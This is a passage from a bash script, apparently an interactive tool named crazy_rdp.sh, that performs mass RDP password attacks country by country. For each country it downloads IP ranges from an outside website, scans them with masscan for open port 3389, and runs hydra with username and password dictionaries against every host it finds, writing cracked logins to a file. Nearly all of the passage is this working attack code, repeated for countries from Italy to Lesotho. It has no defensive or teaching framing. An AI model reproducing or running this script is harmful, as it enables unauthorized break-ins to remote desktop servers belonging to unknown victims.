echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "90" ]; then
curl http://ipdiapazon.16mb.com/Italy.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "91" ]; then
curl http://ipdiapazon.16mb.com/Jamaica.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "92" ]; then
curl http://ipdiapazon.16mb.com/Japan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi

else
if [ $country = "93" ]; then
curl http://ipdiapazon.16mb.com/Jordan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "94" ]; then
curl http://ipdiapazon.16mb.com/Kazakhstan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "95" ]; then
curl http://ipdiapazon.16mb.com/Kenya.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "96" ]; then
curl http://ipdiapazon.16mb.com/Kiribati.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "97" ]; then
curl http://ipdiapazon.16mb.com/Korea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "98" ]; then
curl http://ipdiapazon.16mb.com/Kuwait.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "99" ]; then
curl http://ipdiapazon.16mb.com/Kyrgyzstan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "100" ]; then
curl http://ipdiapazon.16mb.com/Lao.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "101" ]; then
curl http://ipdiapazon.16mb.com/Latvia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "102" ]; then
curl http://ipdiapazon.16mb.com/Lebanon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "103" ]; then
curl http://ipdiapazon.16mb.com/Lesotho.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
